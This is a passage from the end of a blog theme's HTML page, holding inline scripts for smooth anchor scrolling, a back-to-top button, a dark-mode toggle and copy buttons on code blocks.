            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
